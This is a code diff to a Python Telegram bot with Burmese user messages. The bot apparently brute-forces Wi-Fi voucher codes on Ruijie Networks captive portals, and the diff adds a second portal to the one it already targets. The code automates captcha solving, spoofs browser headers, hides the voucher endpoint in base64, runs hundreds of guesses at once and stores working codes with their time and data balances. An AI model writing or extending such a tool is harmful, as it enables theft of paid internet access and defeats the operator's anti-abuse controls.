@@ -18,10 +18,10 @@ REPO_NAME = os.environ.get('REPO_NAME')
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data = {}              # {chat_id: {"session_url": ...}}
+user_data = {}              # {chat_id: {"session_url": ..., "portal_type": ...}}
 approve = {}                # {chat_id: True/False}
 scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
-success_texts = {}          # {chat_id: [{"code": ..., "session_id": ..., "plan": ..., "usage": ..., "quota": ..., "expire": ...}, ...]}
+success_texts = {}          # {chat_id: [{"code": ..., "session_id": ..., "plan": ..., "usage": ..., "quota": ...}, ...]}
 limited_texts = {}          # {chat_id: [code, ...]}
 captcha_state = {}          # captcha cache per chat_id
 
@@ -39,9 +39,46 @@ CONCURRENCY = 500
 _voucher_sem = None
 _start_time = time.monotonic()
 
-# Domain changed to portal-mm-as.ruijienetworks.com
-BASE_DOMAIN = "portal-mm-as.ruijienetworks.com"
-BASE_URL = f"https://{BASE_DOMAIN}"
+# ── Portal Configuration ───────────────────────────────────────────────────
+# ဒါနှစ်ခုလုံး ထည့်သွင်းထားပါတယ်။ လွယ်ကူစွာ ပြောင်းသုံးနိုင်ပါတယ်။
+PORTAL_CONFIGS = {
+    "portal-mm-as": {
+        "domain": "portal-mm-as.ruijienetworks.com",
+        "base_url": "https://portal-mm-as.ruijienetworks.com",
+        "voucher_api": base64.b64decode(
+            b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
+        ).decode(),
+        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
+        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
+        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
+        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
+        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15",
+    },
+    "portal-as": {
+        "domain": "portal-as.ruijienetworks.com",
+        "base_url": "https://portal-as.ruijienetworks.com",
+        "voucher_api": base64.b64decode(
+            b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
+        ).decode(),
+        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
+        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
+        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
+        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
+        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15",
+    }
+}
+
+# Default portal (ပြောင်းလိုပါက ဒီနေရာမှာ ပြောင်းပါ)
+DEFAULT_PORTAL = "portal-mm-as"  # ဒါကို "portal-as" လို့ ပြောင်းနိုင်ပါတယ်
+
+def get_portal_config(session_url=None):
+    """Determine which portal to use based on session URL or default"""
+    if session_url:
+        if "portal-mm-as" in session_url:
+            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
+        elif "portal-as" in session_url:
+            return PORTAL_CONFIGS["portal-as"], "portal-as"
+    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL
 
 # ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
@@ -204,18 +241,18 @@ def _format_quota(used, total):
     except:
         return "N/A"
 
-async def get_balance(token):
+async def get_balance(token, portal_config):
     """Fetch remaining time AND data usage for a given token."""
-    url = f"{BASE_URL}/api/auth/balance/getBalance/{token}"
+    url = f"{portal_config['balance_api']}/{token}"
     cookies = {
         'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
     }
     headers = {
-        'authority': BASE_DOMAIN,
+        'authority': portal_config['domain'],
         'accept': 'application/json, text/javascript, */*; q=0.01',
         'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json;',
-        'referer': f'{BASE_URL}/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
+        'referer': portal_config['referer_balance'].format(token=token),
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Linux"',
@@ -230,7 +267,7 @@ async def get_balance(token):
             raw = await resp.text()
             if resp.status != 200:
                 # Fallback to previous known working URL if 404
-                alt_url = f"{BASE_URL}/api/macc2/balance/getBalance/{token}"
+                alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                 async with session.get(alt_url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as alt_resp:
                     raw = await alt_resp.text()
                     if alt_resp.status != 200:
@@ -387,12 +424,12 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
     except:
         return previous_session_id
 
-async def Captcha_Image(session_obj, session_id):
+async def Captcha_Image(session_obj, session_id, portal_config):
     headers = {
-        'authority': BASE_DOMAIN,
+        'authority': portal_config['domain'],
         'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'referer': f'{BASE_URL}/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
+        'referer': portal_config['referer_index'] + session_id,
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Linux"',
@@ -402,17 +439,17 @@ async def Captcha_Image(session_obj, session_id):
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
-    async with session_obj.get(f'{BASE_URL}/api/auth/captcha/image', params=params, headers=headers) as req:
+    async with session_obj.get(portal_config['captcha_image_api'], params=params, headers=headers) as req:
         return await req.read()
 
-async def Varify_Captcha(session_obj, session_id, text):
+async def Varify_Captcha(session_obj, session_id, text, portal_config):
     headers = {
-        'authority': BASE_DOMAIN,
+        'authority': portal_config['domain'],
         'accept': '*/*',
         'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/json',
-        'origin': BASE_URL,
-        'referer': f'{BASE_URL}/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
+        'origin': portal_config['base_url'],
+        'referer': portal_config['referer_index'] + session_id,
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Linux"',
@@ -422,7 +459,7 @@ async def Varify_Captcha(session_obj, session_id, text):
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
     }
     json_data = {'sessionId': session_id, 'authCode': text}
-    async with session_obj.post(f'{BASE_URL}/api/auth/captcha/verify', headers=headers, json=json_data) as req:
+    async with session_obj.post(portal_config['captcha_verify_api'], headers=headers, json=json_data) as req:
         data = await req.json()
         print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
         return session_id if data.get("success") == True else None
@@ -457,10 +494,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         if not current_task or current_task.get("scan_id") != scan_id:
             return
 
-    # Updated for portal-mm-as.ruijienetworks.com
-    post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-    ).decode()
+    # Get portal config based on session URL
+    portal_config, portal_name = get_portal_config(session_url)
+    post_url = portal_config['voucher_api']
 
     response = None
     session_id = None
@@ -479,11 +515,11 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             auth_code = None
             for _ in range(8):
                 try:
-                    image = await Captcha_Image(task_session, session_id)
+                    image = await Captcha_Image(task_session, session_id, portal_config)
                     text = await Captcha_Text(image)
                     if not text:
                         continue
-                    if await Varify_Captcha(task_session, session_id, text):
+                    if await Varify_Captcha(task_session, session_id, text, portal_config):
                         auth_code = text
                         break
                 except:
@@ -503,12 +539,12 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 "authCode": auth_code,
             }
             headers = {
-                "authority": BASE_DOMAIN,
+                "authority": portal_config['domain'],
                 "accept": "*/*",
                 "accept-language": "en-US,en;q=0.9",
                 "content-type": "application/json",
-                "origin": BASE_URL,
-                "referer": f"{BASE_URL}/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
+                "origin": portal_config['base_url'],
+                "referer": portal_config['referer_index'] + session_id,
                 "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                 "sec-ch-ua-mobile": "?1",
                 "sec-ch-ua-platform": '"Android"',
@@ -554,7 +590,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                 token = sid_match.group(1) if sid_match else session_id
                 
-            balance_info = await get_balance(token)
+            balance_info = await get_balance(token, portal_config)
             if isinstance(balance_info, dict):
                 plan_str = balance_info.get("time", "N/A")
                 usage_str = balance_info.get("usage", "N/A")
@@ -578,7 +614,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             "plan": plan_str,
             "usage": usage_str,
             "quota": quota_str,
-            "expire": expire_str
+            "expire": expire_str,
+            "portal": portal_name
         })
 
         await SUCCESS_CODE.put({
@@ -599,6 +636,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     line += f"\n   📊 {item['usage']}"
                 if item.get('quota') and item['quota'] != 'N/A':
                     line += f" | 💾 {item['quota']}"
+                if item.get('portal'):
+                    line += f" | 🌐 {item['portal']}"
                 code_lines.append(line)
             code_text = "\n".join(code_lines)
             
@@ -765,7 +804,8 @@ async def help_cmd(message):
     help_text = (
         "📚 **Command လမ်းညွှန်**\n\n"
         "၁။ **Setup**:\n"
-        "   /setup <url>\n\n"
+        "   /setup <url>\n"
+        "   (portal-mm-as သို့မဟုတ် portal-as URL)\n\n"
         "၂။ **ရှာဖွေခြင်း**:\n"
         "   /brute <mode> <length> [target]\n"
         "   Mode:\n"
@@ -809,7 +849,7 @@ async def handle_key(message):
 async def handle_setup(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
+        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url\n\nဥပမာ:\nhttps://portal-mm-as.ruijienetworks.com/...\nသို့မဟုတ်\nhttps://portal-as.ruijienetworks.com/...")
         return
     url = args[1]
     if not approve.get(message.chat.id, False):
@@ -818,7 +858,8 @@ async def handle_setup(message):
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
     if await check_session_url(url):
         cid = message.chat.id
-        user_data[cid] = {'session_url': url}
+        portal_config, portal_name = get_portal_config(url)
+        user_data[cid] = {'session_url': url, 'portal_type': portal_name}
         # Clear old success/limited data for fresh start
         success_texts.pop(cid, None)
         limited_texts.pop(cid, None)
@@ -834,7 +875,7 @@ async def handle_setup(message):
                 await update_file_content("result.json", results, sha, f"Clear codes for {cid} on new setup")
         except Exception as e:
             print(f"[setup] Failed to clear GitHub result.json: {e}")
-        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
+        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}\n/brute ဖြင့် စတင်ပါ။")
     else:
         await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
 
@@ -977,6 +1018,7 @@ async def saved_codes(message):
             usage = item.get("usage", "N/A")
             quota = item.get("quota", "N/A")
             expire = item.get("expire", "N/A")
+            portal = item.get("portal", "N/A")
             
             line = f"`{c}` – ⏳ {plan}"
             if usage != "N/A":
@@ -985,6 +1027,8 @@ async def saved_codes(message):
                 line += f"\n   💾 Quota: {quota}"
             if expire != "N/A":
                 line += f"\n   📅 Expire: {expire}"
+            if portal != "N/A":
+                line += f"\n   🌐 Portal: {portal}"
             parts.append(line)
             parts.append("")  # empty line between codes
     if limited:
@@ -1074,7 +1118,8 @@ async def status(message):
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"✅ Approved Users: {approved_users}\n"
-        f"👥 Sessions Loaded: {len(user_data)}"
+        f"👥 Sessions Loaded: {len(user_data)}\n"
+        f"🌐 Default Portal: {DEFAULT_PORTAL}"
     )
 
 @bot.message_handler(commands=['testbalance'])
@@ -1094,7 +1139,8 @@ async def testbalance(message):
                 "session_id": item["session_id"],
                 "plan": item.get("plan", "N/A"),
                 "usage": item.get("usage", "N/A"),
-                "quota": item.get("quota", "N/A")
+                "quota": item.get("quota", "N/A"),
+                "portal": item.get("portal", "N/A")
             })
 
     if not targets:
@@ -1106,13 +1152,16 @@ async def testbalance(message):
     for t in targets[:3]:  # max 3 codes to avoid spam
         sid = t["session_id"]
         code = t["code"]
+        portal_name = t.get("portal", DEFAULT_PORTAL)
+        portal_config = PORTAL_CONFIGS.get(portal_name, PORTAL_CONFIGS[DEFAULT_PORTAL])
         
         # Get full balance info
-        balance_info = await get_balance(sid)
+        balance_info = await get_balance(sid, portal_config)
         
         result = (
             f"🎯 Code: `{code}`\n"
             f"🔑 Session ID: `{sid}`\n"
+            f"🌐 Portal: {portal_name}\n"
             f"⏳ Time: {balance_info.get('time', 'N/A')}\n"
             f"📊 Usage: {balance_info.get('usage', 'N/A')}\n"
             f"💾 Quota: {balance_info.get('quota', 'N/A')}\n"
